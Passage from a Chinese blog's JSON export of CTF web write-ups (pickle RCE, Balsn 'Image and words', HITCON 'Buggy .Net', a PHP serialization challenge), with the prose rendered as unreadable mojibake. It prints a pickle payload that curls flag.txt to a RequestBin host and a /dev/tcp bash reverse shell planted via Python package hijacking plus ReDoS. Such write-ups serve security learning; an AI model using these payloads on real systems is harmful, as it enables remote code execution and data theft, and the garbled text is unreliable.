10çœ‹çœ‹ã€‚å‘ç°ç¡®å®æ˜¯åœäº†10sæ‰è¿”å›500ã€‚æˆ‘ä»¬çš„å‘½ä»¤æˆåŠŸæ‰§è¡Œäº†ï¼Œæ²¡å›æ˜¾ï¼Œé‚£å°±å¼¹shelläº†ã€‚BUUOJä¸‹å¼¹shellæœ‰ç‚¹éš¾ï¼Œè¯•ä¸€ä¸‹è¿™ä¸ªç¯å¢ƒæœ‰æ²¡æœ‰curlå§ï¼Œé…åˆHTTPRequestBinã€‚å‘ç°å¯è¡Œï¼ŒåŒæ—¶flag.txtåœ¨å½“å‰ç›®å½•ä¸‹ã€‚ 1234567import pickleimport base64import osclass evil(object): def __reduce__(self): return (os.system,(&#x27;curl -X POST --data &quot;test=`cat flag.txt`&quot; http://http.requestbin.buuoj.cn/19tec0n1&#x27;,))print(base64.b64encode(pickle.dumps(evil()))) å°±æ‹¿åˆ°flagäº†ã€‚ flag{83e228ed-71f1-4a62-834e-23d9ea42b430}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"}]},{"title":"Balsn-CTF-2019-Image-and-words","slug":"Balsn-CTF-2019-Image-and-words","date":"2020-02-06T04:12:49.000Z","updated":"2020-02-06T13:40:10.010Z","comments":true,"path":"2020/02/06/Balsn-CTF-2019-Image-and-words/","link":"","permalink":"http://tiaonmmn.github.io/2020/02/06/Balsn-CTF-2019-Image-and-words/","excerpt":"","text":"Balsn CTF 2019çš„Image and wordsï¼Œå½“æ—¶0è§£ã€‚ ç»™äº†ä¸ªZipæ–‡ä»¶ï¼Œé‡Œé¢æœ‰å®Œæ•´çš„ç¯å¢ƒã€‚å…ˆçœ‹ä¸€ä¸‹run.shï¼š 123456gunicorn \\ --bind &quot;$default_bind&quot; \\ --worker-class uvicorn.workers.UvicornWorker \\ --workers 1 \\ --umask 007 \\ main:server gunicornèµ·çš„æœåŠ¡ï¼Œåªå…è®¸ä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Ÿæœ‰ç‚¹æ„æ€ï¼Œè¿˜ä¸çŸ¥é“ä»€ä¹ˆç”¨ã€‚ main.pyæ˜¯ä¸»æœåŠ¡äº†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env python3from pathlib import Pathimport subprocessimport reimport secretsfrom starlette.applications import Starlettefrom starlette.responses import HTMLResponsefrom starlette.background import BackgroundTaskfrom starlette.staticfiles import StaticFilesimport configimport text2imageDEFAULT_RESPONSE = HTMLResponse(&#x27;&#x27;&#x27;&lt;h1&gt;Images and Words&lt;/h1&gt;Convert text to a png file!&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload text&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&#x27;&#x27;&#x27;)server = Starlette(debug=config.DEBUG)config.UPLOAD_DIR.mkdir(mode=0o700, exist_ok=True)server.mount(&#x27;/static&#x27;, app=StaticFiles(directory=str(config.UPLOAD_DIR)))def sanitize_filename(dangerous_filename): print(len(dangerous_filename)) res = re.match(r&#x27;^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$&#x27;, dangerous_filename) safe_filename = secrets.token_urlsafe(32)[:32] if res is None else dangerous_filename return safe_filenamedef render(filename): src = config.UPLOAD_DIR / filename with open(src, &#x27;r&#x27;) as f: text = f.read() src.unlink() dst = config.UPLOAD_DIR / (filename + &#x27;.png&#x27;) with open(dst, &#x27;wb&#x27;) as f: text2image.render(text, f)@server.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request): if request.method == &#x27;POST&#x27;: form = await request.form() if not form.get(&#x27;file&#x27;): return DEFAULT_RESPONSE filename = sanitize_filename(form[&#x27;file&#x27;].filename[:config.MAX_FILENAME_LEN]) data = form[&#x27;file&#x27;].file.read(config.MAX_TEXT_LEN) with open(config.UPLOAD_DIR / filename, &#x27;wb&#x27;) as f: f.write(data) return HTMLResponse(f&#x27;&#x27;&#x27;Your file will soon be available in &lt;a href=&quot;static/&#123;filename&#125;.png&quot;&gt;static/&#123;filename&#125;.png&lt;/a&gt;&#x27;&#x27;&#x27;, background=BackgroundTask(render, filename)) return DEFAULT_RESPONSE Starletteæ¡†æ¶èµ·çš„ä¸€ä¸ªTXTè½¬PNGçš„WebæœåŠ¡ã€‚æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ¤æ–­ä¸Šä¼ æ–‡ä»¶åéå±é™©æ–‡ä»¶ååread()è¯»å–ï¼Œåˆ é™¤åŸæ–‡ä»¶ï¼Œè°ƒç”¨text2imageæ¸²æŸ“ï¼Œåœ¨staticç›®å½•ä¸‹ç”Ÿæˆéšæœºæ–‡ä»¶åçš„PNGç»“æœæ–‡ä»¶ã€‚æ–‡ä»¶ååˆ©ç”¨secrets.token_urlsafeæ¥ç”Ÿæˆã€‚ç”±æ­¤å¯çŸ¥ï¼Œæœ¬é¢˜ä¸ºPython 3.6ä»¥ä¸Šç¯å¢ƒã€‚ï¼ˆsecretsæ¨¡å—ä¸ºPython 3.6å¼•å…¥çš„æ ‡å‡†åº“ï¼‰ä¸Šä¼ çš„ç›®å½•ä¸ºpngç›®å½•ï¼ˆä»config.pyä¸­æ¥ï¼‰ã€‚ çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå†çœ‹çœ‹text2imageæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œç”¨è¿™ä¸ªæ”¹çš„ï¼Œæ²¡å•¥æ„æ€ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæ²¡å‘ç°é—®é¢˜ã€‚ä¸‹é¢æˆ‘ä»¬å¯èƒ½è¦è€ƒè™‘ä¸€ä¸‹Starletteæ¡†æ¶çš„é—®é¢˜äº†ï¼Œä½†åœ¨æ­¤ä¹‹å‰ï¼Œå†çœ‹ä¸€ä¸‹requirements.txtï¼Œå‘ç°æœ‰ä¸ªpypngåº“ã€‚è€Œtext2image.pyé‡Œä¹Ÿå‡ºç°äº†import pngï¼Œpngå¯¹åº”ç€pypngåº“ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸ç”Ÿæˆçš„æ–‡ä»¶éƒ½æ”¾åœ¨pngç›®å½•ä¸‹ï¼Œè¿™å°±æœ‰é—®é¢˜äº†ã€‚çœ‹ä¸€ä¸‹æ–‡æ¡£ï¼ŒPythonä½¿ç”¨Packagesçš„æ¦‚å¿µæ¥è¿›è¡ŒåŠŸèƒ½ç®¡ç†ã€‚Python3èµ·å­˜åœ¨ä¸¤ç§Packageï¼Œä¸€ä¸ªå«Regular Packageï¼Œä¸€ä¸ªå«Namespace Packageã€‚Regular Packageå°±æ˜¯ä¸€ä¸ªåŒ…å«æœ‰__init__.pyçš„æ–‡ä»¶å¤¹ã€‚Pythonåœ¨importçš„æ—¶å€™é»˜è®¤ä½¿ç”¨import pathæŸ¥æ‰¾Packageï¼Œimport pathé»˜è®¤æƒ…å†µä¸‹è·Ÿéšsys.pathï¼Œè€Œå½“å‰æ–‡ä»¶å¤¹ä¸ºsys.pathçš„ç¬¬ä¸€é¡¹å†…å®¹ã€‚Pythonåœ¨import Packageçš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡ŒåŒ…çš„__init__.pyã€‚ å¥½äº†ï¼Œå¾ˆæ˜æ˜¾ï¼Œå¦‚æœæˆ‘ä»¬æå‰å†™å…¥ä¸€ä¸ª__init__.pyï¼Œå°±å¯ä»¥è¦†ç›–æ‰pypngçš„png Packageï¼Œè¿›è€ŒRCEã€‚ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œæœ¬é¢˜æ˜¯ç”¨Gunicornèµ·çš„ï¼ŒGunicorné‡‡ç”¨Pre-forkæ¨¡å‹ï¼ŒpypngåŒ…å·²ç»åŠ è½½å®Œæˆäº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹å¼è®©Gunicorné‡æ–°å¯åŠ¨main:serverï¼ŒåŠ è½½æˆ‘ä»¬æ¶æ„çš„png Packageã€‚ æ³¨æ„åˆ°run.shé‡ŒGunicornè°ƒç”¨æ—¶æ²¡æœ‰è®¾ç½®è¶…æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹Gunicornè¶…æ—¶è®¾ç½®30ç§’ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥è®©workerå¡ä½30ç§’ä»¥ä¸Šï¼Œé‚£ä¹ˆGunicornå°±ä¼šé‡å¯workerï¼Œè¿™æ—¶å°±ä¼šåŠ è½½æ¶æ„çš„png Packageã€‚ å›åˆ°main.pyï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸¤ä¸ªç‚¹å¯èƒ½é€ æˆDOSï¼Œä¸€ä¸ªæ˜¯sanitize_filename()é‚£é‡Œç”¨äº†ä¸ªå¾ˆé•¿çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯èƒ½é€ æˆReDOSï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯render()é‚£é‡Œä¸Šä¼ æ—¶æ–‡ä»¶è¿‡å¤§å°±å¯èƒ½é€ æˆDOSã€‚ä½†æ˜¯åˆç”¨getsize()é™åˆ¶äº†å¤§å°ï¼Œæ­¤è·¯ä¸é€šã€‚ æˆ‘ä»¬çœ‹ä¸€ä¸‹é‚£ä¸ªæ­£åˆ™ï¼Œ^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$ï¼ŒåŒ¹é…a-z A-Z 0-9 _ -è¿™äº›ç¬¦å·ï¼Œå…³é”®åœ¨åé¢çš„()åˆ†ç»„é‡Œä½¿ç”¨äº†*è´ªå©ªæ¨¡å¼ï¼Œå°½å¯èƒ½çš„åŒ¹é…å­—ç¬¦ï¼Œå­—ç¬¦ä¸€æ—¦å¤šäº†å°±ä¼šå¤„ç†ç¼“æ…¢ï¼Œä¾‹å¦‚æˆ‘ä»¬æäº¤ä¸€ä¸ªaaaaaaaaaaaaaaaaaaaa!ï¼Œåœ¨regex101.comä¸ŠåŒ¹é…è¿™ä¸ªæ­£åˆ™ä¼šæŠ¥Catastrophic backtrackingã€‚ æˆ‘ä»¬ç°åœ¨æœ‰åŠæ³•è®©workeråœä¸‹æ¥30ç§’äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ²¡è§£å†³ï¼šæˆ‘ä»¬æ²¡æ³•ä¸Šä¼ pngæ–‡ä»¶å¤¹ï¼Œåªèƒ½ä¸Šä¼ å•ä¸ªæ–‡ä»¶ã€‚å†å›åˆ°main.pyé‡Œï¼Œå‘ç°render()å‡½æ•°ä¸­è¯»å–æ–‡æœ¬å†…å®¹ç”¨çš„æ˜¯read()å‡½æ•°ï¼Œæ²¡æœ‰å…¶ä»–å‚æ•°ï¼Œread()å®Œæˆåä¼šunlink()æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬è®©read()å¼‚å¸¸ï¼Œå°±ä¼šç›´æ¥è·³å‡ºè¿™ä¸ªå‡½æ•°ï¼Œunlink()å°±ä¸èƒ½èµ·ä½œç”¨äº†ã€‚é¢˜ç›®ä¸­read()æ²¡åŠ å…¶ä»–å‚æ•°ï¼Œé‚£ä¹ˆé»˜è®¤ç¼–ç æ˜¯UTF-8ï¼Œé‡åˆ°ç¼–ç é”™è¯¯å°±ä¼šæŠ¥å¼‚å¸¸ã€‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªéUTF-8ç¼–ç çš„æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ æœ¬é¢˜æ‰€æœ‰éš¾ç‚¹å…¨éƒ¨è§£å†³ï¼Œä¸‹é¢å°±æ˜¯æ“ä½œäº†ï¼š é¦–å…ˆç”Ÿæˆæˆ‘ä»¬è¦æ‰§è¡Œçš„__init__.pyã€‚ä¸ºæ–¹ä¾¿èµ·è§ï¼Œä¸åˆ†è¡Œå†™äº†ï¼Œå¹¶ä¸”å¼¹ä¸€ä¸ªshellå‡ºæ¥ã€‚__import__('os').system('bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1 ')ã€‚ ç„¶åéœ€è¦å°†å…¶è½¬æˆéUTF-8ç¼–ç çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬é€‰ä¸ªGB2312å§ï¼ˆè¯»å†™ä¸­æ–‡æ–‡æœ¬æ—¶åº”è¯¥éƒ½æ²¡å°‘è¢«å®ƒæŠ˜ç£¨è¿‡ï¼‰ã€‚ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼ŒPython3è„šæœ¬é»˜è®¤ä½¿ç”¨UTF-8ç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬æ”¹å˜æ–‡ä»¶ç¼–ç ï¼Œéœ€è¦åœ¨pyæ–‡ä»¶å¤´åŠ ä¸€å¥# coding=GB2312å£°æ˜ä¸€ä¸‹ï¼Œå¹¶ä¸”æ’å…¥ç¡®å®ä¸UTF-8å­—ç¬¦ç¼–ç ä¸ç›¸åŒçš„å­—ç¬¦ï¼Œä¾‹å¦‚ä¸­æ–‡ã€‚å› æ­¤__init__.pyå®é™…å†…å®¹ä¸ºï¼š 123# coding&#x3D;GB2312#æµ‹è¯•__import__(&#39;os&#39;).system(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1 &#39;) ç”¨iconvè½¬ç iconv -f utf-8 -t gb2312 &lt; payload.py &gt; __init__.py å†™ä¸ªè„šæœ¬ä¸Šä¼ ï¼š 1234import requestss=requests.session()s.post(&#x27;http://127.0.0.1:8080/&#x27;,files=&#123;&#x27;file&#x27;:(&#x27;__init__.py&#x27;,open(&#x27;__init__.py&#x27;,&#x27;rb&#x27;).read())&#125;)s.post(&#x27;http://127.0.0.1:8080&#x27;,files=&#123;&#x27;file&#x27;:(&#x27;a*31&#x27;+&#x27;!&#x27;,b&#x27;&#x27;)&#125;) æ”¶shellã€‚ flag{b65583ad-a2ba-4473-91fa-0b1d38f6889f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJåˆ·é¢˜-Web-Buggy-Net","slug":"BUUOJåˆ·é¢˜-Web-Buggy-Net","date":"2019-12-07T11:32:44.000Z","updated":"2019-12-11T15:22:42.322Z","comments":true,"path":"2019/12/07/BUUOJåˆ·é¢˜-Web-Buggy-Net/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Buggy-Net/","excerpt":"HITCON 2019çš„Buggy_Netï¼Œå°‘è§çš„C#é¢˜å•Šã€‚&#x1f34a;å¤§å¤§çš„é¢˜ã€‚ å…ˆè¯´ä¸€ä¸‹ï¼Œflagåœ¨C:\\FLAG.txté‡Œã€‚ ç»™äº†æºç ï¼š","text":"HITCON 2019çš„Buggy_Netï¼Œå°‘è§çš„C#é¢˜å•Šã€‚&#x1f34a;å¤§å¤§çš„é¢˜ã€‚ å…ˆè¯´ä¸€ä¸‹ï¼Œflagåœ¨C:\\FLAG.txté‡Œã€‚ ç»™äº†æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://bootswatch.com/4/sketchy/bootstrap.min.css&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; .form-control-borderless &#123; border: none; &#125; .form-control-borderless:hover, .form-control-borderless:active, .form-control-borderless:focus &#123; border: none; outline: none; box-shadow: none; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&#x27;container&#x27;&gt; &lt;br&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;h1&gt;&lt;font style=&quot;font-size: 200%&quot;&gt;Buggy .Net&lt;/font&gt;&lt;/h1&gt; &lt;/div&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;i&gt; Here is the source for you: &lt;a href=&#x27;Default.txt&#x27;&gt;Default.txt&lt;/a&gt;&lt;/i&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;div class=&quot;col-12 col-md-10 col-lg-12&quot;&gt; &lt;form class=&quot;card card-sm&quot; method=&quot;POST&quot; action=&quot;&quot;&gt; &lt;div class=&quot;card-body row no-gutters align-items-center&quot;&gt; &lt;div class=&quot;col&quot;&gt; &lt;input class=&quot;form-control form-control-lg form-control-borderless&quot; type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;filename...&quot;&gt; &lt;/div&gt; &lt;div class=&quot;col-auto&quot;&gt; &lt;button class=&quot;btn btn-lg btn-success&quot; type=&quot;submit&quot;&gt;Send&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;h3&gt;&lt;font color=&#x27;red&#x27;&gt;&lt;% bool isBad = false; try &#123; if ( Request.Form[&quot;filename&quot;] != null ) &#123; isBad = Request.Form[&quot;filename&quot;].Contains(&quot;..&quot;) == true; &#125; &#125; catch (Exception ex) &#123; &#125; try &#123; if (!isBad) &#123; Response.Write(System.IO.File.ReadAllText(@&quot;C:\\inetpub\\wwwroot\\&quot; + Request.Form[&quot;filename&quot;])); &#125; &#125; catch (Exception ex) &#123; &#125;%&gt;&lt;/font&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 1. Deploy éå¸¸å°‘è§çš„ASP.NETçš„é¢˜ï¼Œæˆ‘ä»¬å…ˆç ”ç©¶ä¸€ä¸‹è¿™é¢˜å¦‚ä½•æœ¬åœ°å¤ç°ã€‚å¥½åœ¨å°±ä¸€ä¸ªæ–‡ä»¶ï¼Œå€’ä¹Ÿæ–¹ä¾¿ã€‚ å…ˆæ”¶é›†ä¸€ä¸‹ä¿¡æ¯ï¼Œæ ¹æ®è¿”å›å¤´ï¼Œå‘ç°ç”¨çš„æ˜¯IIS 10å’ŒASP.NET 4.0ã€‚IIS 10è·Ÿç€çš„æ˜¯Windows Server 2016ã€‚é‚£æˆ‘ä»¬å°±æ­ä¸€ä¸ªå¥½äº†ï¼Œä¸éš¾ï¼Œæ³¨æ„è¦é€‰é‚£ä¸ªæ¡Œé¢ä½“éªŒï¼ŒServer Coreç‰ˆæœ¬æ²¡æ¡Œé¢ç¯å¢ƒï¼Œå¯¹è¿™é“é¢˜è€Œè¨€çº¯å±è‡ªæ‰¾éº»çƒ¦ã€‚ VSä¹Ÿæ˜¯å¿…è¦çš„ï¼ŒRiderä¹Ÿè¡Œã€‚æˆ‘ç”¨VS2019äº†ã€‚ æ³¨æ„ï¼Œä¸èƒ½ç”¨ASP.NET Coreçš„é¡¹ç›®ï¼ŒASP.NET Coreè·ŸASP.NET 4å·®äº†å¾ˆå¤šï¼Œ.Net Frameworkç‰ˆæœ¬è¦é€‰4.0ã€‚ åœ¨VSé‡Œæ–°å»ºWebçª—ä½“ï¼ŒæŠŠä»£ç ç²˜è´´è¿‡å»ï¼Œç¼–è¯‘ã€‚ ä¸‹ä¸€æ­¥éƒ¨ç½²ï¼Œæˆ‘ç›´æ¥å¤åˆ¶æ–‡ä»¶åæ€»ä¼šæœ‰ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæ‰€ä»¥ç”¨å¾®è½¯æ¨èçš„Web Deployæ–¹å¼éƒ¨ç½²ã€‚å‚è€ƒè¿™ä¸ªï¼Œä¸€æ­¥æ­¥ç…§åšå°±å¥½äº†ã€‚æœ€åè®°å¾—æ”¹ä¸‹é»˜è®¤æ–‡æ¡£ï¼Œè¦ä¸å°±æŠŠæ–°å»ºçš„Webçª—ä½“é‡å‘½åæˆdefault.aspxã€‚ ç„¶åå‡†å¤‡è¿œç¨‹è°ƒè¯•ï¼Œå‚è€ƒè¿™ä¸ªï¼Œç…§åšã€‚ 2. Audit å›è¿‡å¤´çœ‹æºç ï¼Œæ ¸å¿ƒåœ¨è¿™é‡Œï¼š 12345678910111213141516bool isBad = false;try &#123; if ( Request.Form[&quot;filename&quot;] != null ) &#123; isBad = Request.Form[&quot;filename&quot;].Contains(&quot;..&quot;) == true; &#125;&#125; catch (Exception ex) &#123; &#125; try &#123; if (!isBad) &#123; Response.Write(System.IO.File.ReadAllText(@&quot;C:\\inetpub\\wwwroot\\&quot; + Request.Form[&quot;filename&quot;])); &#125;&#125; catch (Exception ex) &#123;&#125; ä»Request.Formå–filenameçš„å€¼ï¼Œå¦‚æœåŒ…å«..åˆ™åˆ¤æ–­ä¸è¿‡ï¼Œå¦åˆ™åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚ç”¨C:\\inetpub\\wwwroot\\åŠ ä¸Šåˆšæ‰çš„filenameå€¼æ‹¼æ¥è€Œæˆã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯C:\\FLAG.txtï¼Œä½†æ˜¯ç›®å½•åœ¨C:\\inetpub\\wwwrootï¼Œå› æ­¤æˆ‘ä»¬ç¡®å®éœ€è¦..\\æˆ–../æ¥è·³åˆ°ä¸Šå±‚ç›®å½•ã€‚ ç„¶åæ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œè¿™é‡Œå®ƒä½¿ç”¨äº†tryæ¥å¤„ç†å¼‚å¸¸ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬è®©Request.Form['filename']å–å€¼çš„æ—¶å€™å‘ç”Ÿå¼‚å¸¸ï¼Œè€Œå®ƒåˆå®é™…ä¸Šå…·æœ‰åˆæ³•çš„å€¼ï¼Œ å°±å¯ä»¥ç»•è¿‡äº†ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„æ€è·¯æ— å¤–ä¹ä¸¤ç‚¹ï¼š ä»Request.Formå…¥æ‰‹ï¼Œç ”ç©¶Request.Formçš„å–å€¼æ˜¯å¦æœ‰é—®é¢˜ ä»System.IO.File.ReadAllTextå…¥æ‰‹ï¼Œç ”ç©¶ä¼ å…¥å‚æ•°æ˜¯å¦æœ‰é—®é¢˜ å…ˆä»Request.Formå…¥æ‰‹å§ï¼ŒSystem.IO.File.ReadAllTextæ˜¯ä¸ªç³»ç»Ÿå‡½æ•°ï¼Œåº”è¯¥æ²¡æœ‰å¤ªå¤§é—®é¢˜ã€‚ 3. Request.Form å…ˆçœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼ŒFormæ˜¯HttpRequestå¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå½“è¯·æ±‚çš„Content-Typeä¸º\"application/x-www-form-urlencode\"æˆ–è€…\"multipart/form-data\"æ—¶ä¼šè¢«å¡«å……ã€‚ ç„¶åä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆä¿¡æ¯äº†ã€‚é‚£æˆ‘ä»¬æœä¸€ä¸‹ASP.NET 4 request.formï¼Œç„¶åå‘ç°äº†ç›¸å½“æœ‰è¶£çš„ç»“æœï¼šA potentially dangerous Request Form value was detectedï¼Œè¿™ç¯‡æ–‡ç« è¯´è‡ªå·±åœ¨æäº¤å®Œæ•´HTMLçš„ä»£ç æ—¶å‘ç”Ÿé”™è¯¯ï¼Œç„¶åæ‰¾åˆ°äº†è¿™ä¸ªï¼ŒASP.NET 1.1å’Œ2ä¼šè‡ªåŠ¨é˜»æ­¢ä»»ä½•æœªç»ç¼–ç çš„HTMLæ–‡æœ¬æäº¤ã€‚é‚£ä¹ˆASP.NET 4å‘¢ï¼Ÿæˆ‘ä»¬æ‰¾ä¸€ä¸‹ASP.NET 4çš„change logï¼Œæ‰¾åˆ°äº†è¿™ä¸ªï¼ŒASP.NET 4å¼€å§‹ä¼šå¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡ŒéªŒè¯ã€‚æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ã€‚ æŠŠæºç ä¸­C#ä»£ç æ®µæ”¹æˆè¿™æ ·ï¼š 123 é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰å¯èƒ½bypassï¼Ÿæ‰¾åˆ°äº†è¿™ä¸ªã€‚ flag{301f80db-8086-4fe8-a2ec-fe92c88bb6e3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"ASP.NET","slug":"ASP-NET","permalink":"http://tiaonmmn.github.io/tags/ASP-NET/"}]},{"title":"BUUOJåˆ·é¢˜-Web-easy_serialize_php","slug":"BUUOJåˆ·é¢˜-Web-easy-serialize-php","date":"2019-12-03T00:56:28.000Z","updated":"2019-12-07T11:18:48.798Z","comments":true,"path":"2019/12/03/BUUOJåˆ·é¢˜-Web-easy-serialize-php/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/","excerpt":"å®‰æ´µæ¯ 2019çš„é¢˜ã€‚ æ‰“å¼€å°±ç»™äº†æˆ‘ä»¬æºç ï¼š","text":"å®‰æ´µæ¯ 2019çš„é¢˜ã€‚ æ‰“å¼€å°±ç»™äº†æˆ‘ä»¬æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; ä»£ç ä¸­æç¤ºæˆ‘ä»¬è¦å»çœ‹phpinfoï¼Œå‘ç°æœ‰å¦‚ä¸‹disable_functionsï¼špcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,ï¼Œè€Œä¸”auto_append_fileé‡Œæœ‰ä¸ªd0g3_f1ag.phpï¼Œåº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶äº†ã€‚ å›æ¥çœ‹æºç ï¼Œfilter()è¿‡æ»¤äº†php flag php5 php4 fllgï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤phtmlï¼Ÿæ³¨æ„åˆ°ä»£ç ä¸­ä¸€è¡Œå¾ˆåˆºçœ¼çš„extract($_POST);ï¼Œå˜é‡è¦†ç›–ï¼Ÿè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¦†ç›–æ‰\\(\\_SESSIONäº†ã€‚ç„¶åfilter(serialize(\\)_SESSION))ï¼Œå¦‚æœè°ƒç”¨å‡½æ•°ä¸ºshow_imageï¼Œé‚£ä¹ˆå†serializeï¼Œfile_get_contentsåºåˆ—åŒ–åçš„imgçš„å€¼ã€‚ 